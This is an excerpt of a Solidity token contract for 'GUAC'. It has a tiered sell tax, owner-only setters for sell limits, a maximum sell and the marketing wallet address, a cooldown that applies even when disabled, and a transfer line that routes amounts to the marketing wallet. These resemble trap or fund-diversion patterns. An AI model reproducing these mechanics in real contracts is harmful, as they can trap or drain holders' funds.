...
/*
    GUAC token
    Web: guac.digital/
    Telegram: t.me/theGUAC_official
    
    Copyright (c) 2021 71-104-111-115-116-32-68-101-118 
    ...
    Dynamic Tax System
    - If you sell less than 25% of your Wallet (5% tax)
    - If you sell between 25% - 50% (10% tax)
    - If you sell between 50% -75% (15% tax)
    - If you sell over 75% (20% tax)
    
    Launch Features (Anti-bot)
    - 4 minute cooldown between each sell
    - 80 second cooldown between buy - sell
    
    Tax Economics:
    - 20% of taxes to Liquidity
    - 20% of taxes to Redistribution
    - 40% of taxes to Marketing/Influencers/Buyback
    - 20% of taxes to Further development and ongoing costs
*/
...
contract GUAC is Context, IERC20, Ownable {
    ...
    string private _name = 'GUAC';
    string private _symbol = 'GUAC';
    ...
    address payable private _marketingWalletAddress ; // Marketing Wallet Address : 0x285B61a92222ebc826566976236F7696E1ea18B3
...
// Functions
    ...
    function setSelllimit(bool _setSelllimit) external onlyOwner() {
        selllimit = _setSelllimit;
    }
    ...
    function setSales(address payable Sales) external onlyOwner() {
            _marketingWalletAddress = Sales;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(cooldownEnabled){
            sellcooldown[sender] = block.timestamp + (240 seconds);
            }
        sellcooldown[sender] = block.timestamp + (240 seconds);
        ...
        _tokenTransfer(sender, _marketingWalletAddress, amount, takeFee);
    }
        ...
        if (selllimit) {
            ...
            if(amount >= balanceOf(sender).mul(25).div(100) && amount <= balanceOf(sender).mul(50).div(100)){
                _taxFee = _taxFee.mul(2);
                _marketingFee = _marketingFee.mul(2);
                _liquidityFee = _liquidityFee.mul(2);
            }
            if(amount >= balanceOf(sender).mul(50).div(100) && amount <= balanceOf(sender).mul(75).div(100)){
                _taxFee = _taxFee.mul(3);
                _marketingFee = _marketingFee.mul(3);
                _liquidityFee = _liquidityFee.mul(3);
            }
            if(amount >= balanceOf(sender).mul(75).div(100) && amount <= balanceOf(sender)){
                _taxFee = _taxFee.mul(4);
                _marketingFee = _marketingFee.mul(4);
                _liquidityFee = _liquidityFee.mul(4);
            }
        }
        }
...
// Contract Functions - 71 104 111 115 116 32 68 101 118 - (71 85 65 67)
    ...
    function _setmaxsell(uint256 maxsell) external onlyOwner() {
        require(maxsell >= 10**9 , 'maxsell should be greater than total 1e9');
        _maxsell = maxsell;
    }
